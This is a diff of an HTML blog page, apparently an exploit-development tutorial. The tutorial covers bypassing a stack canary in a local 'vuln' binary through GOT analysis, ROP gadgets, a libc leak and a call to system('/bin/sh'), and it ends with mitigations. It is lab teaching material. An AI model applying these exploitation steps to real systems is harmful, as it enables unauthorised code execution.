-</span><span class='line'>value stored on the last byte (8th): 0x000000000060101f =&gt; \x00</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">analyse</span> <span class="n">puts</span><span class="p">()</span> <span class="n">GOT</span> <span class="n">entry</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">1</span><span class="n">st</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x0000000000601018</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x90</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">2</span><span class="n">nd</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x0000000000601019</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x46</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">3</span><span class="n">rd</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x000000000060101a</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x4c</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">4</span><span class="n">th</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x000000000060101b</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x0e</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">5</span><span class="n">th</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x000000000060101c</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">xbc</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">6</span><span class="n">th</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x000000000060101d</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x7f</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="mi">7</span><span class="n">th</span> <span class="nl">byte</span> <span class="p">:</span> <span class="mh">0x000000000060101e</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x00</span>
+</span><span class='line'><span class="n">value</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="n">last</span> <span class="n">byte</span> <span class="p">(</span><span class="mi">8</span><span class="n">th</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x000000000060101f</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">x00</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>Control <code>RIP</code></h2>
@@ -928,8 +947,9 @@
 
 <p>Execute <code>exploit_v03.py</code> and observe <code>RIP</code> = <code>0xdeadbeef</code></p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v03.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v03</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">m</span> <span class="nb">true</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span> <span class="o">-</span><span class="n">g</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -1168,7 +1188,7 @@
 
 <p>Replace <code>0xdeadbeef</code> with (5 <code>POP</code> + <code>RETN</code>) gadget <code>address</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -1187,37 +1207,39 @@
 <span class='line-number'>17</span>
 <span class='line-number'>18</span>
 <span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># scenario: 1
-</span><span class='line'>0x7ffc50cc5178 =&gt; when EIP = deadbeef, RSP points here
-</span><span class='line'>0x7ffc50cc5180 =&gt; input name
-</span><span class='line'>0x7ffc50cc5188 =&gt; input name
-</span><span class='line'>0x7ffc50cc5190 =&gt; input name
-</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address
-</span><span class='line'>0x7ffc50cc51a8 =&gt; pad bytes (DDDDDDDD)
-</span><span class='line'>0x7ffc50cc51b0 =&gt; canary (EEEEEEEE)
-</span><span class='line'>0x7ffc50cc51b8 =&gt; EBP (FFFFFFFF)
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># scenario: 1</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5178</span> <span class="o">=&gt;</span> <span class="n">when</span> <span class="n">EIP</span> <span class="o">=</span> <span class="n">deadbeef</span><span class="p">,</span> <span class="n">RSP</span> <span class="n">points</span> <span class="n">here</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5180</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5188</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5190</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51a0</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span> <span class="o">=&gt;</span> <span class="n">overwrite</span> <span class="n">heap_pointer</span> <span class="n">with</span> <span class="p">.</span><span class="n">GOT</span> <span class="n">address</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51a8</span> <span class="o">=&gt;</span> <span class="n">pad</span> <span class="n">bytes</span> <span class="p">(</span><span class="n">DDDDDDDD</span><span class="p">)</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51b0</span> <span class="o">=&gt;</span> <span class="n">canary</span> <span class="p">(</span><span class="n">EEEEEEEE</span><span class="p">)</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51b8</span> <span class="o">=&gt;</span> <span class="n">EBP</span> <span class="p">(</span><span class="n">FFFFFFFF</span><span class="p">)</span>
 </span><span class='line'>
-</span><span class='line'># scenario: 2
-</span><span class='line'>0x7ffc50cc5178 =&gt; EIP = (5 POP + RETN) gadget address
-</span><span class='line'>0x7ffc50cc5180 =&gt; input name
-</span><span class='line'>0x7ffc50cc5188 =&gt; input name
-</span><span class='line'>0x7ffc50cc5190 =&gt; input name
-</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address
-</span><span class='line'>0x7ffc50cc51a8 =&gt; pad bytes (DDDDDDDD)
-</span><span class='line'>0x7ffc50cc51b0 =&gt; canary (EEEEEEEE) =&gt; RSP points here
-</span><span class='line'>0x7ffc50cc51b8 =&gt; EBP (FFFFFFFF)</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="cp"># scenario: 2</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5178</span> <span class="o">=&gt;</span> <span class="n">EIP</span> <span class="o">=</span> <span class="p">(</span><span class="mi">5</span> <span class="n">POP</span> <span class="o">+</span> <span class="n">RETN</span><span class="p">)</span> <span class="n">gadget</span> <span class="n">address</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5180</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5188</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5190</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51a0</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span> <span class="o">=&gt;</span> <span class="n">overwrite</span> <span class="n">heap_pointer</span> <span class="n">with</span> <span class="p">.</span><span class="n">GOT</span> <span class="n">address</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51a8</span> <span class="o">=&gt;</span> <span class="n">pad</span> <span class="n">bytes</span> <span class="p">(</span><span class="n">DDDDDDDD</span><span class="p">)</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51b0</span> <span class="o">=&gt;</span> <span class="n">canary</span> <span class="p">(</span><span class="n">EEEEEEEE</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">RSP</span> <span class="n">points</span> <span class="n">here</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51b8</span> <span class="o">=&gt;</span> <span class="n">EBP</span> <span class="p">(</span><span class="n">FFFFFFFF</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>Find the Gadget</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[+] find the 'POP POP POP POP POP POP RETN' gadget:
-</span><span class='line'>ROPgadget --binary vuln | grep pop
-</span><span class='line'>[SNIPPED..]
-</span><span class='line'>0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret   =&gt; selecting this gadget</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">find</span> <span class="n">the</span> <span class="err">&#39;</span><span class="n">POP</span> <span class="n">POP</span> <span class="n">POP</span> <span class="n">POP</span> <span class="n">POP</span> <span class="n">POP</span> <span class="n">RETN</span><span class="err">&#39;</span> <span class="nl">gadget</span><span class="p">:</span>
+</span><span class='line'><span class="n">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="n">vuln</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">pop</span>
+</span><span class='line'><span class="p">[</span><span class="n">SNIPPED</span><span class="p">..]</span>
+</span><span class='line'><span class="mh">0x00000000004008bb</span> <span class="o">:</span> <span class="n">pop</span> <span class="n">rbp</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">r13</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">r14</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">r15</span> <span class="p">;</span> <span class="n">ret</span>   <span class="o">=&gt;</span> <span class="n">selecting</span> <span class="n">this</span> <span class="n">gadget</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Update the <code>exploit_v04.py</code> with the <code>ROPgadget</code> address => <code>0x00000000004008bb</code>, replace <code>DDDDDDDD</code> with <code>0xdeadbeef</code>.</p>
@@ -1226,8 +1248,9 @@
 
 <p>During crash, <code>RSP</code> will point to <code>EEEEEEEE</code> or <code>0x4545454545454545</code> and <code>RIP</code> = <code>0xdeadbeef</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v04.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v04</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">m</span> <span class="nb">true</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span> <span class="o">-</span><span class="n">g</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -1479,8 +1502,9 @@
 
 <p><code>puts()</code> will try to print all values stored from that address until it gets a <code>null</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>got.plt:0000000000601030 off_601030      dq offset malloc        ; DATA XREF: _malloc</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">got</span><span class="p">.</span><span class="nl">plt</span><span class="p">:</span><span class="mo">0000000000601030</span> <span class="n">off_601030</span>      <span class="n">dq</span> <span class="n">offset</span> <span class="n">malloc</span>        <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">_malloc</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>Call <code>puts()</code></h2>
@@ -1489,15 +1513,16 @@
 
 <p>Search a gadget for <code>POP RDI; RETN</code></p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>╰─$ ROPgadget --binary vuln | grep "pop rdi"
-</span><span class='line'>0x00000000004008c3 : pop rdi ; ret</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">╰─$</span> <span class="n">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="n">vuln</span> <span class="o">|</span> <span class="n">grep</span> <span class="s">&quot;pop rdi&quot;</span>
+</span><span class='line'><span class="mh">0x00000000004008c3</span> <span class="o">:</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">ret</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><strong>Set up the <code>Stack</code></strong></p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -1506,21 +1531,23 @@
 <span class='line-number'>7</span>
 <span class='line-number'>8</span>
 <span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># scenario: 2
-</span><span class='line'>0x7ffc50cc5178 =&gt; EIP = (5 POP + RETN) gadget address
-</span><span class='line'>0x7ffc50cc5180 =&gt; input name
-</span><span class='line'>0x7ffc50cc5188 =&gt; input name
-</span><span class='line'>0x7ffc50cc5190 =&gt; input name
-</span><span class='line'>0x7ffc50cc51a0 =&gt; input name =&gt; overwrite heap_pointer with .GOT address
-</span><span class='line'>0x7ffc50cc51a8 =&gt; `0xdeadbeef`: replace with `POP RDI; RETN` gadget address - `0x00000000004008c3`
-</span><span class='line'>0x7ffc50cc51b0 =&gt; `canary` (`EEEEEEEE`): replace with `0000000000601030`=&gt; (malloc .GOT)
-</span><span class='line'>0x7ffc50cc51b8 =&gt; EBP (FFFFFFFF): replace with `0xdeadbeef`</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># scenario: 2</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5178</span> <span class="o">=&gt;</span> <span class="n">EIP</span> <span class="o">=</span> <span class="p">(</span><span class="mi">5</span> <span class="n">POP</span> <span class="o">+</span> <span class="n">RETN</span><span class="p">)</span> <span class="n">gadget</span> <span class="n">address</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5180</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5188</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc5190</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51a0</span> <span class="o">=&gt;</span> <span class="n">input</span> <span class="n">name</span> <span class="o">=&gt;</span> <span class="n">overwrite</span> <span class="n">heap_pointer</span> <span class="n">with</span> <span class="p">.</span><span class="n">GOT</span> <span class="n">address</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51a8</span> <span class="o">=&gt;</span> <span class="err">`</span><span class="mh">0xdeadbeef</span><span class="err">`</span><span class="o">:</span> <span class="n">replace</span> <span class="n">with</span> <span class="err">`</span><span class="n">POP</span> <span class="n">RDI</span><span class="p">;</span> <span class="n">RETN</span><span class="err">`</span> <span class="n">gadget</span> <span class="n">address</span> <span class="o">-</span> <span class="err">`</span><span class="mh">0x00000000004008c3</span><span class="err">`</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51b0</span> <span class="o">=&gt;</span> <span class="err">`</span><span class="n">canary</span><span class="err">`</span> <span class="p">(</span><span class="err">`</span><span class="n">EEEEEEEE</span><span class="err">`</span><span class="p">)</span><span class="o">:</span> <span class="n">replace</span> <span class="n">with</span> <span class="err">`</span><span class="mo">0000000000601030</span><span class="err">`</span><span class="o">=&gt;</span> <span class="p">(</span><span class="n">malloc</span> <span class="p">.</span><span class="n">GOT</span><span class="p">)</span>
+</span><span class='line'><span class="mh">0x7ffc50cc51b8</span> <span class="o">=&gt;</span> <span class="n">EBP</span> <span class="p">(</span><span class="n">FFFFFFFF</span><span class="p">)</span><span class="o">:</span> <span class="n">replace</span> <span class="n">with</span> <span class="err">`</span><span class="mh">0xdeadbeef</span><span class="err">`</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Update the <code>exploit_v05.py</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v05.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v05</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">m</span> <span class="nb">true</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span> <span class="o">-</span><span class="n">g</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -1766,20 +1793,21 @@
 
 <p><img src="/downloads/code/2019/canary_bypass/image-20190727122050900.png" alt="image-20190727122050900" /></p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pwndbg&gt; print system =&gt; 0x7fb0b924d390
-</span><span class='line'>system_offset = 0x7fb0b924d390 - 0x7fb0b928c130 (libc_malloc_leak)
-</span><span class='line'>system_address = libc_leak + system_offset
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">print</span> <span class="n">system</span> <span class="o">=&gt;</span> <span class="mh">0x7fb0b924d390</span>
+</span><span class='line'><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x7fb0b924d390</span> <span class="o">-</span> <span class="mh">0x7fb0b928c130</span> <span class="p">(</span><span class="n">libc_malloc_leak</span><span class="p">)</span>
+</span><span class='line'><span class="n">system_address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">+</span> <span class="n">system_offset</span>
 </span><span class='line'>
-</span><span class='line'>pwndbg&gt; search "/bin/sh" =&gt; 0x7fb0b9394d57
-</span><span class='line'>bin_sh_offset = 0x7fda54c56d57 - 0x7fb0b928c130 (libc_malloc_leak)
-</span><span class='line'>bin_sh_address = libc_leak + bin_sh_offset</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">search</span> <span class="s">&quot;/bin/sh&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x7fb0b9394d57</span>
+</span><span class='line'><span class="n">bin_sh_offset</span> <span class="o">=</span> <span class="mh">0x7fda54c56d57</span> <span class="o">-</span> <span class="mh">0x7fb0b928c130</span> <span class="p">(</span><span class="n">libc_malloc_leak</span><span class="p">)</span>
+</span><span class='line'><span class="n">bin_sh_address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">+</span> <span class="n">bin_sh_offset</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>At this point, we have all information to call <code>system('\bin\sh')</code>.</p>
@@ -1790,8 +1818,9 @@
 
 <p>However, if we jump back to <code>main()</code> then again we can control our input.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pwndbg&gt; print main =&gt; 0x00000000004007b8</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">print</span> <span class="n">main</span> <span class="o">=&gt;</span> <span class="mh">0x00000000004007b8</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="/downloads/code/2019/canary_bypass/image-20190727150248410.png" alt="image-20190727150248410" /></p>
@@ -1800,8 +1829,9 @@
 
 <p>We need to take control of the <code>RIP</code> again through <code>canary</code> corruption but this time, during stack step up, we call <code>system('\bin\sh')</code> instead of calling <code>puts()</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v06.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v06</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">m</span> <span class="nb">true</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span> <span class="o">-</span><span class="n">g</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><code>continue</code> the program and get the <code>/bin/sh</code> shell.</p>
@@ -1814,8 +1844,9 @@
 
 <p>Run the exploit in <code>standalone</code> mode without <code>debug</code> and <code>gcc</code> attached.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v06.py local -b vuln</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v06</span><span class="p">.</span><span class="n">py</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -2097,14 +2128,15 @@
 
 <p>We can prevent this exploitation by restricting the input within the size of the buffer.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>puts("Enter name:");
-</span><span class='line'>scanf("%19s", c.name);  // as the size of the `name` variable is 20 bytes
-</span><span class='line'>puts("Enter description:");
-</span><span class='line'>scanf("%99s", c.description); // as the size of the `description` is 100 bytes</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter name:&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%19s&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>  <span class="c1">// as the size of the `name` variable is 20 bytes</span>
+</span><span class='line'><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter description:&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%99s&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">.</span><span class="n">description</span><span class="p">);</span> <span class="c1">// as the size of the `description` is 100 bytes</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>We can also use extra <code>compiler</code> options to make the exploitation hard.</p>
@@ -2115,7 +2147,7 @@
 </ol>
 
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -2126,17 +2158,18 @@
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(playbook) ╭─asinha@ubuntu01 ~/exploit-dev/vampire_class/bypass_canary_02
-</span><span class='line'>╰─$ gcc -fpie -pie -Wl,-z,relro,-z,now -o vuln_hardened vuln.c
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">playbook</span><span class="p">)</span> <span class="err">╭─</span><span class="n">asinha</span><span class="err">@</span><span class="n">ubuntu01</span> <span class="o">~/</span><span class="n">exploit</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">vampire_class</span><span class="o">/</span><span class="n">bypass_canary_02</span>
+</span><span class='line'><span class="err">╰─$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">fpie</span> <span class="o">-</span><span class="n">pie</span> <span class="o">-</span><span class="n">Wl</span><span class="p">,</span><span class="o">-</span><span class="n">z</span><span class="p">,</span><span class="n">relro</span><span class="p">,</span><span class="o">-</span><span class="n">z</span><span class="p">,</span><span class="n">now</span> <span class="o">-</span><span class="n">o</span> <span class="n">vuln_hardened</span> <span class="n">vuln</span><span class="p">.</span><span class="n">c</span>
 </span><span class='line'>
-</span><span class='line'>(playbook) ╭─asinha@ubuntu01 ~/exploit-dev/vampire_class/bypass_canary_02
-</span><span class='line'>╰─$ checksec vuln_hardened
-</span><span class='line'>[*] '/home/asinha/exploit-dev/vampire_class/bypass_canary_02/vuln_hardened'
-</span><span class='line'>    Arch:     amd64-64-little
-</span><span class='line'>    RELRO:    Full RELRO
-</span><span class='line'>    Stack:    Canary found
-</span><span class='line'>    NX:       NX enabled
-</span><span class='line'>    PIE:      PIE enabled</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="p">(</span><span class="n">playbook</span><span class="p">)</span> <span class="err">╭─</span><span class="n">asinha</span><span class="err">@</span><span class="n">ubuntu01</span> <span class="o">~/</span><span class="n">exploit</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">vampire_class</span><span class="o">/</span><span class="n">bypass_canary_02</span>
+</span><span class='line'><span class="err">╰─$</span> <span class="n">checksec</span> <span class="n">vuln_hardened</span>
+</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">asinha</span><span class="o">/</span><span class="n">exploit</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">vampire_class</span><span class="o">/</span><span class="n">bypass_canary_02</span><span class="o">/</span><span class="n">vuln_hardened</span><span class="err">&#39;</span>
+</span><span class='line'>    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+</span><span class='line'>    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
+</span><span class='line'>    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+</span><span class='line'>    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+</span><span class='line'>    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -2179,6 +2212,8 @@
       
         <a class="basic-alignment left" href="/blog/2016/11/07/hpnmm-exploit/" title="Previous Post: Exploiting HP OpenView NNM - B.07.53">&laquo; Exploiting HP OpenView NNM - B.07.53</a>
       
+      
